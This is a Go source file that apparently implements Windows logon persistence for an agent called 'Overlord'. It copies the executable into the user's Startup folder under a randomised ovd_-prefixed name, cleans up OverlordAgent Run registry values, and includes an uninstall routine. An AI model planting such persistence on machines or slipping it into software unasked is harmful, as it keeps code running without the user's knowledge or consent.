//go:build windows
// +build windows

package persistence

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"
)

const registryKey = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
const startupFolderRelative = `Microsoft\Windows\Start Menu\Programs\Startup`
const startupExecutablePrefix = "ovd_"

const legacyRegistryValueName = "OverlordAgent"
const registryValuePrefix = "OverlordAgent-"

func getTargetPath() (string, error) {
	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return "", fmt.Errorf("APPDATA environment variable not set")
	}

	startupDir := filepath.Join(appDataDir, startupFolderRelative)
	if existing, ok := findExistingStartupExecutable(startupDir); ok {
		return existing, nil
	}

	name, err := generateStartupExecutableName()
	if err != nil {
		return "", err
	}

	return filepath.Join(startupDir, name), nil
}

func getLegacyTargetPath() (string, bool) {
	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return "", false
	}
	return filepath.Join(appDataDir, "Overlord", "agent.exe"), true
}

func findExistingStartupExecutable(startupDir string) (string, bool) {
	entries, err := os.ReadDir(startupDir)
	if err != nil {
		return "", false
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := strings.ToLower(entry.Name())
		if !strings.HasSuffix(name, ".exe") {
			continue
		}
		if strings.HasPrefix(name, startupExecutablePrefix) {
			return filepath.Join(startupDir, entry.Name()), true
		}
	}

	return "", false
}

func generateStartupExecutableName() (string, error) {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("failed to generate startup executable name: %w", err)
	}
	return startupExecutablePrefix + hex.EncodeToString(b) + ".exe", nil
}

func install(exePath string) error {

	targetPath, err := getTargetPath()
	if err != nil {
		return err
	}

	startupDir := filepath.Dir(targetPath)
	err = os.MkdirAll(startupDir, 0755)
	if err != nil {
		return fmt.Errorf("failed to create startup directory: %w", err)
	}

	if err := replaceExecutable(exePath, targetPath); err != nil {
		return err
	}

	if err := cleanupLegacyRunValues(); err != nil {
		return fmt.Errorf("failed to clean legacy startup registry values: %w", err)
	}

	return nil
}

func replaceExecutable(exePath, targetPath string) error {
	srcFile, err := os.Open(exePath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer srcFile.Close()

	dir := filepath.Dir(targetPath)
	tmpFile, err := os.CreateTemp(dir, "agent-*.tmp")
	if err != nil {
		return fmt.Errorf("failed to create temp executable: %w", err)
	}
	tmpPath := tmpFile.Name()
	defer func() {
		_ = tmpFile.Close()
		_ = os.Remove(tmpPath)
	}()

	if _, err := io.Copy(tmpFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable: %w", err)
	}
	if err := tmpFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync temp file: %w", err)
	}
	if err := tmpFile.Close(); err != nil {
		return fmt.Errorf("failed to close temp file: %w", err)
	}

	if err := os.Rename(tmpPath, targetPath); err != nil {
		if removeErr := os.Remove(targetPath); removeErr == nil {
			if err = os.Rename(tmpPath, targetPath); err == nil {
				return nil
			}
		}
		return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
	}

	return nil
}

func configure(exePath string) error {
	targetPath, err := getTargetPath()
	if err != nil {
		return err
	}

	if exePath != "" && !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		if err := replaceExecutable(exePath, targetPath); err != nil {
			return err
		}
	}

	if err := cleanupLegacyRunValues(); err != nil {
		return fmt.Errorf("failed to clean legacy startup registry values: %w", err)
	}

	return nil
}

func uninstall() error {
	if err := cleanupLegacyRunValues(); err != nil {
		return fmt.Errorf("failed to clean startup registry values: %w", err)
	}

	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return nil
	}

	startupDir := filepath.Join(appDataDir, startupFolderRelative)
	if err := cleanupPrefixedExecutables(startupDir); err != nil {
		return err
	}

	if err := cleanupPrefixedExecutables(filepath.Join(appDataDir, "Overlord")); err != nil {
		return err
	}

	targetPath, err := getTargetPath()
	if err == nil {
		_ = os.Remove(targetPath)
	}

	if legacyPath, ok := getLegacyTargetPath(); ok {
		_ = os.Remove(legacyPath)
	}

	return nil
}

func cleanupPrefixedExecutables(dir string) error {
	entries, err := os.ReadDir(dir)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return fmt.Errorf("failed to read startup cleanup directory %s: %w", dir, err)
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := strings.ToLower(entry.Name())
		if strings.HasPrefix(name, startupExecutablePrefix) {
			if err := os.Remove(filepath.Join(dir, entry.Name())); err != nil && !os.IsNotExist(err) {
				return fmt.Errorf("failed to remove startup artifact %s: %w", filepath.Join(dir, entry.Name()), err)
			}
		}
	}

	return nil
}

func cleanupLegacyRunValues() error {
	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey, registry.SET_VALUE)
	if err != nil {
		if err == registry.ErrNotExist {
			return nil
		}
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer k.Close()

	return cleanupOverlordRunValues(k)
}

func cleanupOverlordRunValues(k registry.Key) error {
	names, err := k.ReadValueNames(0)
	if err != nil {
		return err
	}

	for _, name := range names {
		if isOverlordRunValueName(name) {
			if err := k.DeleteValue(name); err != nil && err != registry.ErrNotExist {
				return err
			}
		}
	}

	return nil
}

func isOverlordRunValueName(name string) bool {
	if strings.EqualFold(name, legacyRegistryValueName) {
		return true
	}
	return strings.HasPrefix(strings.ToLower(name), strings.ToLower(registryValuePrefix))
}
